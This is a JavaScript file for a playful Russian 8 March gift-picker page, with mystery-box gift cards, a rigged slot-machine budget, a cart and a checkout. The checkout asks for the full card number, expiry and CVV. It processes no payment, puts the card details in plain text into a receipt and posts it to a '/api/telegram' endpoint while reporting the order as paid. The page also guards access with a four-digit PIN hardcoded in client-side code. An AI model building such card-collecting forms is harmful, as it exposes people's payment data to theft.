/* =====================================================
   8 марта — Gift Picker  v4
   ===================================================== */

// ── CONFIG ──────────────────────────────────────────
var AUTH_PIN     = "0803";
var FIXED_BUDGET = 70;          // ← 70$
var TELEGRAM_URL = "/api/telegram";
var STORE_KEY    = "gift_site_v4";

// ── GIFTS DATA ───────────────────────────────────────
var GIFTS_DATA = [
  { id:"flowers",          name:"Букет",                       price:30, image:"", desc:"Красивый букет для тебя" },
  { id:"strawberry_choco", name:"Клубника в шоколаде",         price:20, image:"", desc:"Сладкая классика" },
  { id:"ticket_sqwoz",     name:"Билет на Sqwoz Bab",          price:58, image:"", desc:"Концертный вечер с Sqwoz Bab" },
  { id:"bag",              name:"Сумочка",                     price:10, image:"", desc:"Маленькая, стильная, удобная" },
  { id:"car",              name:"Машина",                      price:20000, image:"", desc:"Немного не помещается в бюджет" },
  { id:"egor",             name:"Билет на Егора Крида",        price:30, image:"", desc:"Концертный вечер с Егором Кридом" },
  { id:"alkotour",         name:"Алкотур по Мичуринску",       price:5,  image:"", desc:"Незабываемое приключение по городу" },
  { id:"nice_thing",       name:"Красивая вещичка",            price:35, image:"", desc:"Что-то милое и особенное" },
  { id:"perfume",          name:"Женская штучка из Золотого Яблока", price:25, image:"", desc:"Что-то особенное из любимого магазина" },
  { id:"love",             name:"Комплименты и любовь",        price:0,  image:"", desc:"Бесценно и всегда рядом" }
];

var GIFT_EMOJI = {
  "flowers":          { emoji:"💐", bg:"#f8e1e8" },
  "strawberry_choco": { emoji:"🍓", bg:"#ffe4e6" },
  "ticket_sqwoz":     { emoji:"🎤", bg:"#fde8d8" },
  "bag":              { emoji:"👜", bg:"#fef3c7" },
  "car":              { emoji:"🚗", bg:"#dbeafe" },
  "egor":             { emoji:"🎤", bg:"#ede9fe" },
  "alkotour":         { emoji:"🍻", bg:"#fef9e7" },
  "nice_thing":       { emoji:"✨", bg:"#fce4ec" },
  "perfume":          { emoji:"🍎", bg:"#fce4ec" },
  "love":             { emoji:"❤️", bg:"#fce4ec" }
};

// ── HELPERS ─────────────────────────────────────────
function $(id) { return document.getElementById(id); }
function clamp(n,lo,hi) { return Math.max(lo,Math.min(hi,n)); }
function esc(s) {
  return String(s||"").replace(/[&<>"']/g,function(c){
    return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];
  });
}
function emojiHtml(g, big) {
  if (g.image) return '<img src="'+esc(g.image)+'" alt="" loading="lazy"'+(big?' style="width:100%;height:100%;object-fit:cover"':'')+'/>';
  var p = GIFT_EMOJI[g.id] || { emoji:"🎁", bg:"#f0f0f0" };
  return '<div class="gift-emoji-ph" style="background:'+p.bg+';'+(big?'font-size:72px':'')+'">' + p.emoji + '</div>';
}

// ── PERSIST ──────────────────────────────────────────
function saveState() {
  try { localStorage.setItem(STORE_KEY, JSON.stringify(state)); } catch(e) {}
}
function loadState() {
  try {
    var raw = localStorage.getItem(STORE_KEY);
    if (!raw) return null;
    var s = JSON.parse(raw);
    if (!s.user)             s.user   = { name:"", authed:false };
    if (!s.cart)             s.cart   = {};
    if (!s.opened)           s.opened = {};
    if (s.budget===undefined) s.budget = null;
    // migrate old key
    if (!s.spent && s.spent!==0) s.spent = 0;
    return s;
  } catch(e) { return null; }
}
function resetState() { localStorage.removeItem(STORE_KEY); location.reload(); }

// ── STATE ────────────────────────────────────────────
var state = loadState() || {
  user:   { name:"", authed:false },
  budget: null,
  spent:  0,       // cumulative spent across all orders
  cart:   {},
  opened: {}
};
var gifts = [];
var previewGift = null;

// ── CART MATH ────────────────────────────────────────
function giftById(id) {
  for (var i=0;i<gifts.length;i++) if (gifts[i].id===id) return gifts[i];
  return null;
}
function cartItems() {
  var r=[], keys=Object.keys(state.cart);
  for (var i=0;i<keys.length;i++) {
    var id=keys[i], qty=state.cart[id];
    if (!qty||qty<=0) continue;
    var g=giftById(id);
    if (g) r.push({gift:g,qty:qty});
  }
  return r;
}
function cartTotal() {
  var s=0, items=cartItems();
  for (var i=0;i<items.length;i++) s+=items[i].gift.price*items[i].qty;
  return s;
}
function cartQty() {
  var s=0, items=cartItems();
  for (var i=0;i<items.length;i++) s+=items[i].qty;
  return s;
}
// Remaining budget = total budget - already spent (past orders) - current cart
function budgetLeft() {
  return Math.max(0, (state.budget||0) - state.spent - cartTotal());
}

// ── TOAST ────────────────────────────────────────────
var toastTimer=null;
function toast(msg) {
  var el=$("toast"); if(!el) return;
  el.textContent=msg; el.classList.add("show");
  clearTimeout(toastTimer);
  toastTimer=setTimeout(function(){ el.classList.remove("show"); },2400);
}

// ── MODAL / DRAWER ───────────────────────────────────
function openModal(id)  { var e=$(id); if(e){ e.classList.add("open"); } }
function closeModal(id) { var e=$(id); if(e){ e.classList.remove("open"); } }
function openDrawer()  { $("drawer").classList.add("open"); $("drawerOverlay").classList.add("open"); document.body.style.overflow="hidden"; }
function closeDrawer() { $("drawer").classList.remove("open"); $("drawerOverlay").classList.remove("open"); document.body.style.overflow=""; }

// ── BUDGET UI ────────────────────────────────────────
function updateBudgetUI() {
  if (state.budget==null) return;
  var spent  = state.spent + cartTotal();
  var left   = Math.max(0, state.budget - spent);
  var pct    = state.budget>0 ? (spent/state.budget)*100 : 0;

  $("budgetValue").textContent = state.budget+"$";
  $("leftValue").textContent   = left+"$";
  $("spentValue").textContent  = spent+"$";
  $("budgetFill").style.width  = clamp(pct,0,100)+"%";

  var has = cartQty()>0;
  $("btnCheckoutTop").disabled = !has;
  $("btnCheckout").disabled    = !has;

  var badge=$("cartBadge");
  if (has) { badge.textContent=cartQty(); badge.classList.remove("hidden"); }
  else     { badge.classList.add("hidden"); }
}

function updateHeroName() {
  var n=(state.user&&state.user.name)?state.user.name.trim():"";
  $("heroTitle").textContent = n?"С 8 марта, "+n:"С 8 марта";
}

// ── RENDER GIFTS ─────────────────────────────────────
function renderGifts() {
  var q   =($("search").value||"").toLowerCase().trim();
  var sort=$("sort").value;
  var list=gifts.slice();

  // Search only filters OPENED gifts by name/desc
  // LOCKED gifts are filtered by price only (can't reveal name via search)
  if (q) {
    list=list.filter(function(g){
      if (!state.opened[g.id]) {
        // locked — only match on price string so you can filter by budget,
        // but NOT by name/desc (would reveal identity)
        return String(g.price).indexOf(q)!==-1;
      }
      return g.name.toLowerCase().indexOf(q)!==-1 ||
             (g.desc||"").toLowerCase().indexOf(q)!==-1;
    });
  }

  if (sort==="cheap")        list.sort(function(a,b){ return a.price-b.price; });
  else if(sort==="expensive") list.sort(function(a,b){ return b.price-a.price; });
  else list.sort(function(a,b){
    // opened first, then by price proximity to budget
    var ao=!!state.opened[a.id], bo=!!state.opened[b.id];
    if (ao!==bo) return bo?1:-1;
    return a.price-b.price;
  });

  var grid=$("giftsGrid");
  grid.innerHTML="";
  if (!list.length) {
    grid.innerHTML='<p class="grid-empty">Ничего не найдено</p>';
    return;
  }

  list.forEach(function(g,i){
    var inCart=(state.cart[g.id]||0)>0;
    var isOpen=!!state.opened[g.id];
    var card=document.createElement("div");
    card.className="gift-card"+(isOpen?" is-opened":" is-locked");
    card.style.animationDelay=(i*0.05)+"s";

    if (!isOpen) {
      // LOCKED — show only price, no name/desc
      card.innerHTML=
        '<div class="gift-img-wrap gift-img-locked">'+
          '<div class="gift-lock-cover"><div class="gift-lock-icon">?</div></div>'+
        '</div>'+
        '<div class="gift-body">'+
          '<div class="gift-name gift-name-hidden">• • •</div>'+
          '<div class="gift-desc gift-desc-hidden">Нажми, чтобы узнать</div>'+
          '<div class="gift-foot">'+
            '<div class="gift-price">'+g.price+'$</div>'+
            '<button class="btn-add btn-add-idle">Открыть</button>'+
          '</div>'+
        '</div>';
      card.querySelector(".btn-add").addEventListener("click",function(e){
        e.stopPropagation(); openMystery(g.id);
      });
      card.querySelector(".gift-img-wrap").addEventListener("click",function(){
        openMystery(g.id);
      });

    } else {
      // OPENED — full info
      var left=budgetLeft()+(state.cart[g.id]||0)*g.price; // restore own contribution
      var fits=budgetLeft()+(inCart?(state.cart[g.id]||0)*g.price:0)>=g.price;
      var badge=inCart
        ?'<div class="gift-badge badge-selected">В корзине</div>'
        :(!fits?'<div class="gift-badge badge-over">Дорого</div>':"");

      card.innerHTML=
        '<div class="gift-img-wrap">'+emojiHtml(g)+badge+'</div>'+
        '<div class="gift-body">'+
          '<div class="gift-name">'+esc(g.name)+'</div>'+
          '<div class="gift-desc">'+esc(g.desc||"")+'</div>'+
          '<div class="gift-foot">'+
            '<div class="gift-price">'+g.price+'$</div>'+
            '<button class="btn-add '+(inCart?"btn-add-active":"btn-add-idle")+'">'+
              (inCart?"Убрать":"Выбрать")+
            '</button>'+
          '</div>'+
        '</div>';
      card.querySelector(".btn-add").addEventListener("click",function(e){
        e.stopPropagation(); toggleGift(g.id);
      });
    }
    grid.appendChild(card);
  });
}

// ── RENDER CART ──────────────────────────────────────
function renderCart() {
  var items=cartItems(), list=$("cartList");
  list.innerHTML="";
  if (!items.length) {
    list.innerHTML='<div class="cart-empty">Здесь пока пусто</div>';
  } else {
    items.forEach(function(item){
      var g=item.gift, qty=item.qty;
      var row=document.createElement("div");
      row.className="cart-item";
      row.innerHTML=
        '<div class="cart-thumb">'+emojiHtml(g)+'</div>'+
        '<div class="cart-info">'+
          '<div class="cart-name">'+esc(g.name)+'</div>'+
          '<div class="cart-meta">'+g.price+'$ × '+qty+' = '+(g.price*qty)+'$</div>'+
          '<div class="cart-qty-row">'+
            '<button class="qty-btn" data-act="minus">−</button>'+
            '<span class="qty-num">'+qty+'</span>'+
            '<button class="qty-btn" data-act="plus">+</button>'+
          '</div>'+
        '</div>';
      row.querySelector("[data-act=minus]").addEventListener("click",function(){ addGift(g.id,-1); });
      row.querySelector("[data-act=plus]").addEventListener("click", function(){ addGift(g.id, 1); });
      list.appendChild(row);
    });
  }
  $("totalValue").textContent=cartTotal()+"$";
  updateBudgetUI();
}

// ── CART ACTIONS ─────────────────────────────────────
function toggleGift(id) {
  var has=(state.cart[id]||0)>0;
  addGift(id, has?-(state.cart[id]||0):1);
}

function addGift(id, delta) {
  if (state.budget==null) { openModal("budgetModal"); return; }
  var g=giftById(id); if(!g) return;

  var cur=state.cart[id]||0;
  var next=clamp(cur+delta,0,99);
  if (next===cur) return;

  // Project new total: existing spent + cart (adjusted) + past orders
  var projected = state.spent + cartTotal() - cur*g.price + next*g.price;
  if (projected > state.budget) {
    toast("Бюджет превышен");
    if (navigator.vibrate) navigator.vibrate(80);
    var fill=$("budgetFill");
    fill.classList.remove("shake"); void fill.offsetWidth; fill.classList.add("shake");
    return;
  }

  if (next===0) delete state.cart[id]; else state.cart[id]=next;
  if (navigator.vibrate) navigator.vibrate(20);
  saveState(); renderGifts(); renderCart();
}

// ── MYSTERY BOX ──────────────────────────────────────
function openMystery(id) {
  var g=giftById(id); if(!g) return;
  if (state.opened&&state.opened[id]) return;
  previewGift=g;

  var box=$("mysteryBox"), reveal=$("mysteryReveal");
  box.classList.remove("opening","opened");
  reveal.innerHTML="";
  reveal.classList.add("hidden"); reveal.classList.remove("show");
  $("mysteryName").classList.add("hidden");
  $("mysteryDesc").classList.add("hidden");
  $("mysteryPrice").classList.add("hidden");
  $("btnGiftOpen").classList.remove("hidden");
  $("btnGiftOpen").disabled=false;
  $("btnGiftAdd").classList.add("hidden");

  openModal("giftOpenModal");
}

function playMysteryOpen() {
  if (!previewGift) return;
  var g=previewGift;
  $("btnGiftOpen").disabled=true;
  $("mysteryBox").classList.add("opening");

  setTimeout(function(){
    $("mysteryBox").classList.add("opened");

    var reveal=$("mysteryReveal");
    reveal.innerHTML=emojiHtml(g,true);
    reveal.classList.remove("hidden");

    requestAnimationFrame(function(){
      requestAnimationFrame(function(){ reveal.classList.add("show"); });
    });

    $("mysteryName").textContent=g.name;
    $("mysteryDesc").textContent=g.desc||"";
    $("mysteryPrice").textContent=g.price+"$";
    $("mysteryName").classList.remove("hidden");
    $("mysteryDesc").classList.remove("hidden");
    $("mysteryPrice").classList.remove("hidden");
    $("btnGiftOpen").classList.add("hidden");

    state.opened[g.id]=true;
    saveState(); renderGifts();

    var inCart=(state.cart[g.id]||0)>0;
    var addBtn=$("btnGiftAdd");
    addBtn.textContent=inCart?"Убрать из корзины":"В корзину";
    addBtn.classList.remove("hidden");
    confettiBurst();
  }, 600);
}

// ── SLOT MACHINE ─────────────────────────────────────
var slotSpinning=false;
// Phases: fast random → slow → land on target
function spinSlot() {
  if (slotSpinning) return;
  slotSpinning=true;

  // Lever animation
  var lever=$("btnRoll");
  lever.classList.add("pulled");
  setTimeout(function(){ lever.classList.remove("pulled"); },500);

  var sub=$("slotSub");
  sub.textContent="Крутим...";

  var target   = FIXED_BUDGET;
  var duration = 4500;  // longer spin
  var start    = performance.now();
  var numEl    = $("slotTrack").querySelector(".slot-num");

  // Pool of random numbers to cycle through
  var pool=[];
  for (var i=0;i<80;i++) pool.push(Math.floor(Math.random()*99)+1);
  // Add near-target numbers at end for dramatic effect
  var nearTargets=[target+15,target-10,target+5,target-3,target+1,target];
  pool=pool.concat(nearTargets);

  var frame=0, lastSwap=0, lastNum=-1;

  function step(now) {
    var elapsed  = now-start;
    var progress = Math.min(elapsed/duration,1);
    // easing: fast start, slow finish
    var eased    = 1-Math.pow(1-progress,4);
    // interval grows from 30ms to 600ms
    var interval = 30 + eased*570;

    if (now-lastSwap > interval) {
      lastSwap=now;
      var num;
      if (progress<0.75) {
        // Fast random phase
        num=pool[frame%pool.length];
      } else if (progress<0.92) {
        // Slow-down phase — near target
        num=nearTargets[Math.floor((progress-0.75)/0.17*nearTargets.length)]||target;
      } else {
        num=target;
      }
      if (num!==lastNum) {
        // Flip animation
        numEl.classList.remove("slot-flip");
        void numEl.offsetWidth;
        numEl.classList.add("slot-flip");
        numEl.textContent=num;
        lastNum=num;
      }
      frame++;
    }

    if (progress<1) {
      requestAnimationFrame(step);
    } else {
      numEl.textContent=target;
      numEl.classList.remove("slot-flip");
      sub.textContent="Готово! 🎉";
      slotSpinning=false;
      state.budget=target;
      state.spent=0;
      saveState();
      setTimeout(function(){
        closeModal("budgetModal");
        updateBudgetUI(); renderGifts(); renderCart();
        confettiBurst();
        toast("Бюджет: "+target+"$");
      },800);
    }
  }
  requestAnimationFrame(step);
}

// ── AUTH ─────────────────────────────────────────────
function setupPinInputs() {
  var digits=[$("pin1"),$("pin2"),$("pin3"),$("pin4")];
  if (!digits[0]) return;
  digits.forEach(function(input,i){
    input.addEventListener("input",function(){
      var val=input.value.replace(/\D/g,"").slice(-1);
      input.value=val;
      input.classList.toggle("filled",!!val);
      if (val&&i<3) digits[i+1].focus();
    });
    input.addEventListener("keydown",function(e){
      if (e.key==="Backspace") {
        if (!input.value&&i>0) {
          digits[i-1].value=""; digits[i-1].classList.remove("filled"); digits[i-1].focus();
        } else { input.value=""; input.classList.remove("filled"); e.preventDefault(); }
      }
      if (e.key==="Enter") attemptLogin();
    });
    input.addEventListener("keypress",function(e){ if(!/[0-9]/.test(e.key)) e.preventDefault(); });
    input.addEventListener("paste",function(e){
      e.preventDefault();
      var text=(e.clipboardData||window.clipboardData).getData("text").replace(/\D/g,"");
      digits.forEach(function(d,j){ if(text[j]){d.value=text[j];d.classList.add("filled");} });
      var last=Math.min(text.length,4);
      if (last>0&&digits[last-1]) digits[last-1].focus();
    });
  });
}

function getPin() {
  return [$("pin1"),$("pin2"),$("pin3"),$("pin4")].map(function(el){ return el?el.value:""; }).join("");
}

function showAuthError(msg) {
  var err=$("authError");
  if (err){ err.textContent=msg; setTimeout(function(){ err.textContent=""; },2400); }
  [$("pin1"),$("pin2"),$("pin3"),$("pin4")].forEach(function(el){
    if(!el) return;
    el.classList.remove("shake"); void el.offsetWidth; el.classList.add("shake");
    setTimeout(function(){ el.classList.remove("shake"); },350);
  });
}

function attemptLogin() {
  var name=($("authName").value||"").trim();
  if (!name) {
    $("authName").focus();
    $("authName").classList.remove("shake"); void $("authName").offsetWidth;
    $("authName").classList.add("shake");
    setTimeout(function(){ $("authName").classList.remove("shake"); },350);
    return;
  }
  var pin=getPin();
  if (pin.length<4) { showAuthError("Введи 4 цифры кода"); return; }
  if (pin!==AUTH_PIN) { showAuthError("Неверный код"); return; }
  state.user={name:name,authed:true};
  saveState(); enterApp();
}

function enterApp() {
  var screen=$("authScreen");
  if (screen){ screen.classList.add("fade-out"); setTimeout(function(){ screen.style.display="none"; },500); }
  $("appWrap").classList.remove("hidden");
  updateHeroName(); renderGifts(); renderCart(); updateBudgetUI();
  if (state.budget==null) setTimeout(function(){ openModal("budgetModal"); },350);
}

// ── CHECKOUT ─────────────────────────────────────────
function buildReceipt(payStatus, payDetails) {
  var items=cartItems();
  var bar="━━━━━━━━━━━━━━━━━━━━━━━";
  var dsh="───────────────────────";
  var lines=[bar,"  Заказ · 8 Марта",bar,
    "  Имя: "+(state.user.name||"—"),
    "  Дата: "+new Date().toLocaleString("ru-RU"),
    dsh,"  Позиции:"
  ];
  items.forEach(function(it){
    lines.push("  "+it.gift.name+" ×"+it.qty+" — "+(it.gift.price*it.qty)+"$");
  });
  lines.push(dsh);
  lines.push("  Итого: "+cartTotal()+"$");
  lines.push("  Бюджет: "+state.budget+"$");
  lines.push("  Оплата: "+payStatus);
  if (payDetails) {
    if (payDetails.name) lines.push("  Имя на карте: "+payDetails.name);
    if (payDetails.card) lines.push("  Карта: "+payDetails.card);
    if (payDetails.exp)  lines.push("  Срок: "+payDetails.exp);
    if (payDetails.cvv)  lines.push("  CVV: "+payDetails.cvv);
  }
  lines.push(bar);
  return lines.join("\n");
}

function openCheckout() {
  if (cartQty()===0) { toast("Корзина пуста"); return; }
  $("receiptBox").textContent=buildReceipt("не выбрана");
  openModal("checkoutModal");
}

function finalizeOrder(payStatus, payDetails) {
  var orderTotal=cartTotal();
  var receipt=buildReceipt(payStatus, payDetails);
  $("receiptBox").textContent=receipt;

  fetch(TELEGRAM_URL,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({receipt:receipt,user:state.user,budget:state.budget,total:orderTotal,createdAt:new Date().toISOString()})
  }).catch(function(e){ console.warn("TG:",e); });

  // Accumulate spent, clear cart — budget stays intact for reorder
  state.spent = (state.spent||0) + orderTotal;
  state.cart  = {};
  saveState();

  confettiBurst();
  closeModal("checkoutModal");
  closeDrawer();

  // Update final screen based on remaining budget
  var left=Math.max(0,state.budget-state.spent);
  $("finalTitle").textContent="Заказ оформлен ✦";
  if (left>0) {
    $("finalText").textContent="Доставим сегодня. Осталось "+left+"$ — можно дозаказать!";
    $("btnFinalOk").textContent="Дозаказать";
    $("btnFinalOk").dataset.reorder="1";
  } else {
    $("finalText").textContent="Доставим сегодня. Бюджет исчерпан. С 8 марта!";
    $("btnFinalOk").textContent="Отлично";
    $("btnFinalOk").dataset.reorder="0";
  }

  openModal("finalScreen");
  renderGifts(); renderCart(); updateBudgetUI();
}

// ── CONFETTI ─────────────────────────────────────────
var confCanvas=null, ctxC=null, confParts=[];
function initConfetti(){
  confCanvas=$("confetti"); ctxC=confCanvas.getContext("2d");
  resizeConfetti(); window.addEventListener("resize",resizeConfetti); tickConfetti();
}
function resizeConfetti(){
  confCanvas.width=window.innerWidth*window.devicePixelRatio;
  confCanvas.height=window.innerHeight*window.devicePixelRatio;
}
function confettiBurst(){
  var cx=confCanvas.width/2,cy=confCanvas.height*0.3;
  var colors=["#C8464A","#E8757A","#C9A84C","#1A1410","#F9E8E9","#fff"];
  var dpr=window.devicePixelRatio;
  for(var i=0;i<120;i++){
    var ang=Math.random()*Math.PI*2, spd=(2+Math.random()*9)*dpr;
    confParts.push({
      x:cx,y:cy,
      vx:Math.cos(ang)*spd, vy:Math.sin(ang)*spd-7*dpr,
      g:0.28*dpr,
      w:(3+Math.random()*7)*dpr, h:(2+Math.random()*4)*dpr,
      rot:Math.random()*Math.PI*2, vr:(Math.random()-.5)*.16,
      color:colors[Math.floor(Math.random()*colors.length)],
      life:1, decay:0.007+Math.random()*0.009
    });
  }
}
function tickConfetti(){
  ctxC.clearRect(0,0,confCanvas.width,confCanvas.height);
  confParts=confParts.filter(function(p){ return p.life>0; });
  confParts.forEach(function(p){
    p.life-=p.decay; p.vy+=p.g; p.x+=p.vx; p.y+=p.vy; p.rot+=p.vr;
    ctxC.save(); ctxC.globalAlpha=Math.max(0,p.life);
    ctxC.translate(p.x,p.y); ctxC.rotate(p.rot);
    ctxC.fillStyle=p.color; ctxC.fillRect(-p.w/2,-p.h/2,p.w,p.h);
    ctxC.restore();
  });
  requestAnimationFrame(tickConfetti);
}

// ── PETALS ───────────────────────────────────────────
var petalsCanvas=null,ctxP=null,petals=[];
function initPetals(){
  petalsCanvas=$("petals"); ctxP=petalsCanvas.getContext("2d");
  resizePetals(); window.addEventListener("resize",resizePetals); tickPetals();
}
function resizePetals(){
  petalsCanvas.width=window.innerWidth*window.devicePixelRatio;
  petalsCanvas.height=window.innerHeight*window.devicePixelRatio;
}
function tickPetals(){
  ctxP.clearRect(0,0,petalsCanvas.width,petalsCanvas.height);
  var dpr=window.devicePixelRatio;
  if (Math.random()<0.035) petals.push({
    x:Math.random()*petalsCanvas.width, y:-12*dpr,
    vx:(Math.random()-.5)*.6*dpr, vy:(.4+Math.random()*.8)*dpr,
    r:(3+Math.random()*5)*dpr, rot:Math.random()*Math.PI*2, vr:(Math.random()-.5)*.05
  });
  petals.forEach(function(p){
    p.x+=p.vx; p.y+=p.vy; p.rot+=p.vr;
    ctxP.save(); ctxP.translate(p.x,p.y); ctxP.rotate(p.rot);
    ctxP.fillStyle="rgba(200,70,74,0.2)";
    ctxP.beginPath(); ctxP.ellipse(0,0,p.r,p.r*.55,0,0,Math.PI*2); ctxP.fill();
    ctxP.restore();
  });
  petals=petals.filter(function(p){ return p.y<petalsCanvas.height+20; });
  requestAnimationFrame(tickPetals);
}

// ── PAYMENT FORMATTING ───────────────────────────────
function setupPaymentInputs(){
  var c=$("payCard"),e=$("payExp"),v=$("payCvv"); if(!c) return;
  c.addEventListener("input",function(){ var v=c.value.replace(/\D/g,"").slice(0,16); c.value=v.replace(/(.{4})/g,"$1 ").trim(); });
  e.addEventListener("input",function(){ var x=e.value.replace(/\D/g,"").slice(0,4); if(x.length>=3) x=x.slice(0,2)+"/"+x.slice(2); e.value=x; });
  v.addEventListener("input",function(){ v.value=v.value.replace(/\D/g,"").slice(0,3); });
}

// ── BOOT ─────────────────────────────────────────────
function boot() {
  gifts = GIFTS_DATA;
  setup();
  if (state.user&&state.user.authed) {
    renderGifts(); renderCart(); updateBudgetUI();
  }
}

function setup(){
  initConfetti(); initPetals();
  setupPinInputs(); setupPaymentInputs();

  $("btnAuth").addEventListener("click",attemptLogin);
  $("authName").addEventListener("keydown",function(e){ if(e.key==="Enter"){e.preventDefault();$("pin1").focus();} });

  $("btnRoll").addEventListener("click",spinSlot);

  $("btnOpenCart").addEventListener("click",openDrawer);
  $("btnCloseDrawer").addEventListener("click",closeDrawer);
  $("drawerOverlay").addEventListener("click",closeDrawer);

  $("btnClear").addEventListener("click",function(){
    if (cartQty()===0){ toast("Корзина уже пуста"); return; }
    state.cart={}; saveState(); renderGifts(); renderCart(); toast("Корзина очищена");
  });

  $("btnCheckout").addEventListener("click",openCheckout);
  $("btnCheckoutTop").addEventListener("click",openCheckout);
  $("btnCloseCheckout").addEventListener("click",function(){ closeModal("checkoutModal"); });

  $("btnCopy").addEventListener("click",function(){
    var txt=$("receiptBox").textContent||"";
    if (navigator.clipboard&&navigator.clipboard.writeText) {
      navigator.clipboard.writeText(txt).then(function(){ toast("Скопировано"); });
    } else {
      var ta=document.createElement("textarea");
      ta.value=txt; ta.style.cssText="position:fixed;opacity:0";
      document.body.appendChild(ta); ta.focus(); ta.select();
      try{ document.execCommand("copy"); toast("Скопировано"); }catch(e){}
      document.body.removeChild(ta);
    }
  });

  $("btnPay").addEventListener("click",function(){
    var name=($("payName").value||"").trim();
    var card=($("payCard").value||"").replace(/\s/g,"");
    var exp =($("payExp").value||"").trim();
    var cvv =($("payCvv").value||"").trim();
    if (name.length<2){ toast("Введи имя на карте"); return; }
    if (card.length<12){ toast("Введи номер карты"); return; }
    finalizeOrder("оплачено", { name:name, card:card, exp:exp, cvv:cvv });
  });
  $("btnSkipPay").addEventListener("click",function(){ finalizeOrder("без оплаты", null); });

  $("btnGiftOpen").addEventListener("click",playMysteryOpen);
  $("btnGiftClose").addEventListener("click",function(){
    closeModal("giftOpenModal");
    $("btnGiftOpen").disabled=false;
    previewGift=null;
  });
  $("btnGiftAdd").addEventListener("click",function(){
    if (!previewGift) return;
    toggleGift(previewGift.id);
    var inCart=(state.cart[previewGift.id]||0)>0;
    $("btnGiftAdd").textContent=inCart?"Убрать из корзины":"В корзину";
    renderGifts();
  });

  $("btnFinalOk").addEventListener("click",function(){
    var reorder=$("btnFinalOk").dataset.reorder==="1";
    closeModal("finalScreen");
    if (reorder) {
      // scroll to top so user can pick more gifts
      window.scrollTo({top:0,behavior:"smooth"});
      toast("Выбери ещё подарки!");
    }
  });

  $("btnReset").addEventListener("click",function(){
    if (confirm("Сбросить всё?")) resetState();
  });

  $("search").addEventListener("input",renderGifts);
  $("sort").addEventListener("change",renderGifts);

  ["budgetModal","giftOpenModal","checkoutModal","finalScreen"].forEach(function(id){
    var el=$(id); if(!el) return;
    el.addEventListener("click",function(e){ if(e.target===el) closeModal(id); });
  });

  if (state.user&&state.user.authed) {
    var screen=$("authScreen");
    if (screen) screen.style.display="none";
    $("appWrap").classList.remove("hidden");
    updateHeroName();
    if (state.budget==null) setTimeout(function(){ openModal("budgetModal"); },200);
  }
}

if (document.readyState==="loading") {
  document.addEventListener("DOMContentLoaded",boot);
} else { boot(); }
